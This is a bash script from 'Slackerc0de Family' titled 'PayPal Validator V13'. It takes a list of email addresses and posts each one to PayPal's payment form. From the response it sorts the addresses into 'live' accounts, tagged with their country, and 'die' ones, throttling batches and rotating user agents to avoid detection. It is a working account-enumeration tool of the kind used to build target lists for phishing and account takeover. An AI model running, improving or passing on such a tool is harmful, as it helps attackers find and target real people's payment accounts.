#!/bin/bash
# Slackerc0de Family Present
# PayPal Validator v13 
# 12 November 2017
# By Malhadi Jr.

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m' 
PURPLE='\033[0;35m'
NC='\033[0m'

#set -x
cat <<EOF

           ##########################   #
           ########################    ##
           ####                       ###
           ####                      ####
           #######################   ####
           #######################   ####
                              ####   ####
                              ####   ####
           ##########     ########   ####
           ############     ######   ####
           #####                     ####
           #####                     ####
           ##################    ########
           ####################    ######

              - https://malhadijr.com -
           [+] malhadijr@slackerc0de.us [+]
        
--------------------------------------------------------
        Slackerc0de Family - PayPal Validator V13
                   12 November 2017
--------------------------------------------------------

EOF

usage() { 
  echo "Usage: ./myscript.sh COMMANDS: [-i <list.txt>] [-r <folder/>] [-l {1-1000}] [-t {1-10}] OPTIONS: [-d] [-c]

Command:
-i (20k-US.txt)     File input that contain email to check
-r (result/)        Folder to store the result live.txt and die.txt
-l (60|90|110)      How many list you want to send per delayTime
-t (3|5|8)          Sleep for -t when check is reach -l fold

Options:
-d                  Delete the list from input file per check
-c                  Compress result to compressed/ folder and
                    move result folder to haschecked/
-h                  Show this manual to screen
-u                  Check integrity file then update

Report any bugs to: <Malhadi Jr> fb.com/malhadi.jr
"
  exit 1 
}

# Assign the arguments for each
# parameter to global variable
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            inputFile=${OPTARG}
            ;;
        r)
            targetFolder=${OPTARG}
            ;;
        l)
            sendList=${OPTARG}
            ;;
        t)
            perSec=${OPTARG}
            ;;
        d)
            isDel='y'
            ;;
        c)
            isCompress='y'
            ;;
        h)
            usage
            ;;
    esac
done

# Do automatic update
# before passing arguments
echo "[+] Doing an automatic update from server slackerc0de.us on `date`"


if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

if [ -z "${isCompress}" ]; then
  isCompress='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null
if [[ $inputFile == '' ]]; then
  # Print available file on
  # current folder
  # clear
  tree
  read -p "Enter mailist file: " inputFile
fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check ? [y/n]: " isDel
fi

if [[ $isCompress == '' || $cli_mode == 'interactive' ]]; then
  read -p "Compress the result ? [y/n]: " isCompress
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi


urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}


malhadi_request() {
  SECONDS=0

  useragent=('Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5362 (KHTML, like Gecko) Chrome/14.0.848.0 Safari/5362' 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)' 'Opera/8.77 (Windows NT 6.0; U; en-US) Presto/2.9.179 Version/10.00' 'Mozilla/5.0 (Windows NT 5.1; en-US; rv:1.9.0.20) Gecko/20130614 Firefox/3.6.8' 'Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20141216 Firefox/7.0' 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/5.1)' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/5.1)' 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.1)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5350 (KHTML, like Gecko) Chrome/15.0.827.0 Safari/5350' 'Mozilla/5.0 (Windows NT 5.0; en-US; rv:1.9.2.20) Gecko/20110914 Firefox/5.0.1' 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5311 (KHTML, like Gecko) Chrome/13.0.808.0 Safari/5311' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.1)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5352 (KHTML, like Gecko) Chrome/15.0.874.0 Safari/5352' 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/3.0)' 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0)' 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5361 (KHTML, like Gecko) Chrome/13.0.833.0 Safari/5361' 'Mozilla/5.0 (Windows NT 6.1; en-US; rv:1.9.0.20) Gecko/20120410 Firefox/3.8')
  declare -A countryCodeList=( [AF]="Afghanistan" [AX]="Aland Islands" [AL]="Albania" [DZ]="Algeria" [AS]="American Samoa" [AD]="Andorra" [AO]="Angola" [AI]="Anguilla" [AQ]="Antarctica" [AG]="Antigua and Barbuda" [AR]="Argentina" [AM]="Armenia" [AW]="Aruba" [AU]="Australia" [AT]="Austria" [AZ]="Azerbaijan" [BS]="Bahamas" [BH]="Bahrain" [BD]="Bangladesh" [BB]="Barbados" [BY]="Belarus" [BE]="Belgium" [BZ]="Belize" [BJ]="Benin" [BM]="Bermuda" [BT]="Bhutan" [BO]="Bolivia, Plurinational State of" [BQ]="Bonaire, Sint Eustatius and Saba" [BA]="Bosnia and Herzegovina" [BW]="Botswana" [BV]="Bouvet Island" [BR]="Brazil" [IO]="British Indian Ocean Territory" [BN]="Brunei Darussalam" [BG]="Bulgaria" [BF]="Burkina Faso" [BI]="Burundi" [KH]="Cambodia" [CM]="Cameroon" [CA]="Canada" [CV]="Cape Verde" [KY]="Cayman Islands" [CF]="Central African Republic" [TD]="Chad" [CL]="Chile" [CN]="China Domestic" [C2]="China International" [CX]="Christmas Island" [CC]="Cocos (Keeling) Islands" [CO]="Colombia" [KM]="Comoros" [CG]="Congo" [CD]="Congo, The Democratic Republic of the" [CK]="Cook Islands" [CR]="Costa Rica" [CI]="Cote d'Ivoire" [HR]="Croatia" [CU]="Cuba" [CW]="Curacao" [CY]="Cyprus" [CZ]="Czech Republic" [DK]="Denmark" [DJ]="Djibouti" [DM]="Dominica" [DO]="Dominican Republic" [EC]="Ecuador" [EG]="Egypt" [SV]="El Salvador" [GQ]="Equatorial Guinea" [ER]="Eritrea" [EE]="Estonia" [ET]="Ethiopia" [FK]="Falkland Islands (Malvinas)" [FO]="Faroe Islands" [FJ]="Fiji" [FI]="Finland" [FR]="France" [GF]="French Guiana" [PF]="French Polynesia" [TF]="French Southern Territories" [GA]="Gabon" [GM]="Gambia" [GE]="Georgia" [DE]="Germany" [GH]="Ghana" [GI]="Gibraltar" [GR]="Greece" [GL]="Greenland" [GD]="Grenada" [GP]="Guadeloupe" [GU]="Guam" [GT]="Guatemala" [GG]="Guernsey" [GN]="Guinea" [GW]="Guinea-Bissau" [GY]="Guyana" [HT]="Haiti" [HM]="Heard Island and McDonald Islands" [VA]="Holy See (Vatican City State)" [HN]="Honduras" [HK]="Hong Kong" [HU]="Hungary" [IS]="Iceland" [IN]="India" [ID]="Indonesia" [IR]="Iran, Islamic Republic of" [IQ]="Iraq" [IE]="Ireland" [IM]="Isle of Man" [IL]="Israel" [IT]="Italy" [JM]="Jamaica" [JP]="Japan" [JE]="Jersey" [JO]="Jordan" [KZ]="Kazakhstan" [KE]="Kenya" [KI]="Kiribati" [KP]="Korea, Democratic People's Republic of" [KR]="Korea, Republic of" [KW]="Kuwait" [KG]="Kyrgyzstan" [LA]="Lao People's Democratic Republic" [LV]="Latvia" [LB]="Lebanon" [LS]="Lesotho" [LR]="Liberia" [LY]="Libya" [LI]="Liechtenstein" [LT]="Lithuania" [LU]="Luxembourg" [MO]="Macao" [MK]="Macedonia, The Former Yugoslav Republic of" [MG]="Madagascar" [MW]="Malawi" [MY]="Malaysia" [MV]="Maldives" [ML]="Mali" [MT]="Malta" [MH]="Marshall Islands" [MQ]="Martinique" [MR]="Mauritania" [MU]="Mauritius" [YT]="Mayotte" [MX]="Mexico" [FM]="Micronesia, Federated States of" [MD]="Moldova, Republic of" [MC]="Monaco" [MN]="Mongolia" [ME]="Montenegro" [MS]="Montserrat" [MA]="Morocco" [MZ]="Mozambique" [MM]="Myanmar" [NA]="Namibia" [NR]="Nauru" [NP]="Nepal" [NL]="Netherlands" [NC]="New Caledonia" [NZ]="New Zealand" [NI]="Nicaragua" [NE]="Niger" [NG]="Nigeria" [NU]="Niue" [NF]="Norfolk Island" [MP]="Northern Mariana Islands" [NO]="Norway" [OM]="Oman" [PK]="Pakistan" [PW]="Palau" [PS]="Palestine, State of" [PA]="Panama" [PG]="Papua New Guinea" [PY]="Paraguay" [PE]="Peru" [PH]="Philippines" [PN]="Pitcairn" [PL]="Poland" [PT]="Portugal" [PR]="Puerto Rico" [QA]="Qatar" [RE]="Reunion" [RO]="Romania" [RU]="Russian Federation" [RW]="Rwanda" [BL]="Saint Barthelemy" [SH]="Saint Helena, Ascension and Tristan Da Cunha" [KN]="Saint Kitts and Nevis" [LC]="Saint Lucia" [MF]="Saint Martin (French part)" [PM]="Saint Pierre and Miquelon" [VC]="Saint Vincent and the Grenadines" [WS]="Samoa" [SM]="San Marino" [ST]="Sao Tome and Principe" [SA]="Saudi Arabia" [SN]="Senegal" [RS]="Serbia" [SC]="Seychelles" [SL]="Sierra Leone" [SG]="Singapore" [SX]="Sint Maarten (Dutch part)" [SK]="Slovakia" [SI]="Slovenia" [SB]="Solomon Islands" [SO]="Somalia" [ZA]="South Africa" [GS]="South Georgia and the South Sandwich Islands" [SS]="South Sudan" [ES]="Spain" [LK]="Sri Lanka" [SD]="Sudan" [SR]="Suriname" [SJ]="Svalbard and Jan Mayen" [SZ]="Swaziland" [SE]="Sweden" [CH]="Switzerland" [SY]="Syrian Arab Republic" [TW]="Taiwan, Province of China" [TJ]="Tajikistan" [TZ]="Tanzania, United Republic of" [TH]="Thailand" [TL]="Timor-Leste" [TG]="Togo" [TK]="Tokelau" [TO]="Tonga" [TT]="Trinidad and Tobago" [TN]="Tunisia" [TR]="Turkey" [TM]="Turkmenistan" [TC]="Turks and Caicos Islands" [TV]="Tuvalu" [UG]="Uganda" [UA]="Ukraine" [AE]="United Arab Emirates" [GB]="United Kingdom" [UK]="United Kingdom" [US]="United States" [UM]="United States Minor Outlying Islands" [UY]="Uruguay" [UZ]="Uzbekistan" [VU]="Vanuatu" [VE]="Venezuela, Bolivarian Republic of" [VN]="Viet Nam" [VG]="Virgin Islands, British" [VI]="Virgin Islands, U.S." [WF]="Wallis and Futuna" [EH]="Western Sahara" [YE]="Yemen" [ZM]="Zambia" [ZW]="Zimbabwe" )
  rand_useragent=${useragent[$RANDOM % ${#useragent[@]}]}
  
  posted=`curl -X POST "https://www.paypal.com/cgi-bin/webscr"  -H "accept: */*" -H 'content-type: application/x-www-form-urlencoded' -d 'business='$1'&cmd=_xclick-subscriptions&add=1&item_name=palkon&amount=1.2&currency_code=USD' -s --compressed -D -`
  duration=$SECONDS

  captcha="$(echo "$posted" | grep -c 'Enter the characters you see in the image')"

  countryCode="$(echo "$posted" | grep -o -P '(?<=paypal.com).*(?=cgi-bin)' | tail -1 | awk -F[\/\/] '{print $2}' | tr '[:lower:]' '[:upper:]')"

  header="${PURPLE}`date +%H:%M:%S`${NC} from ${CYAN}$inputFile${NC} to ${ORANGE}$targetFolder${NC}"
  footer="[Slackercode - PayPalValid V13] $(($duration % 60))sec.\n"

  if [[ $countryCode == '' || $countryCode == 'CGI-BIN' ]]; then
    printf "[$header] $2/$3. ${RED}DIE => $1 ${NC} $footer"
    echo "$1" >> $4/die.txt
  else
    if [[ $captcha > 0 ]]; then
      printf "[$header] $2/$3. ${CYAN}CAPTCHA => $1 ${NC} $footer"
      echo "$1" >> $5
    else
      country=${countryCodeList[$countryCode]}
      printf "[$header] $2/$3. ${PURPLE}LIVE [$country] ($countryCode) => $1 ${NC} $footer"
      echo "[$country] ($countryCode) => $1" >> $4/live.txt
    fi
  fi

  # rm -f $1.html

  printf "\r"
}

if [[ ! -f $inputFile ]]; then
  echo "[404] File mailist not found. Check your mailist file name."
  ls -l
  exit
fi

# Preparing file list 
# by using email pattern 
# every line in $inputFile
echo "[+] Cleaning your mailist file"
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile

# Finding match mail provider
echo "########################################"
# Print total line of mailist
totalLines=`grep -c "@" $inputFile`
echo "There are $totalLines of list."
echo " "
echo "Hotmail: `grep -c "@hotmail" $inputFile`"
echo "Yahoo: `grep -c "@yahoo" $inputFile`"
echo "Gmail: `grep -c "@gmail" $inputFile`"
echo "########################################"

# Extract email per line
# from both input file
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
con=1

# get_token() {
#   echo "Generating token now"
#   pager=`curl "https://www.paypal.com/sg/merchantsignup/applicationChecklist" -s -D -`
#   nsid=`echo "$pager" | grep -oP '(?<=nsid=).*(?=; Pa)' | head -1`
#   csrf=`echo "$pager" | grep -o -P '(?<=_csrf" value=").*(?=form)' | awk -F[\"] '{print $1}'`
#   echo "Token generated. nsid=$nsid | csrf=$csrf"
# }
# get_token

echo "[+] Sending $sendList email per $perSec seconds"

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  username="${mailist[$i]}"
  indexer=$((con++))
  tot=$((totalLines--))
  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
    # echo "Waiting $perSec seconds. $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed, ratio $sendList email / $perSec seconds"
    printf "Waiting $perSec seconds. $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds elapsed, ratio ${YELLOW}$sendList email${NC} / ${CYAN}$perSec seconds${NC}\n"
    sleep $perSec
  fi

  # if [[ -f $targetFolder/unknown.txt ]]; then
  #   echo "Token expired. Waiting last request done..."
  #   wait
  #   sleep 1
  #   get_token
  #   sleep 2
  #   rm -f $targetFolder/unknown.txt
  # fi
  
  malhadi_request "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &

  if [[ $isDel == 'y' ]]; then
    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
  fi
done 

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

if [[ $isCompress == 'y' ]]; then
  tgl=`date`
  tgl=${tgl// /-}
  zipped="$targetFolder-$tgl.zip"

  echo "[+] Compressing result"
  zip -r "compressed/$zipped" "$targetFolder/die.txt" "$targetFolder/live.txt" "$targetFolder/limited.txt"
  echo "[+] Saved to compressed/$zipped"
  mv $targetFolder haschecked
  echo "[+] $targetFolder has been moved to haschecked/"
fi
#rm $inputFile
duration=$SECONDS
echo "Checking done in $(($duration / 3600)) hours $(($duration / 60 % 60)) minutes and $(($duration % 60)) seconds."
echo "+==========+ Slackerc0de Family - v13ppval - By Malhadi Jr +==========+"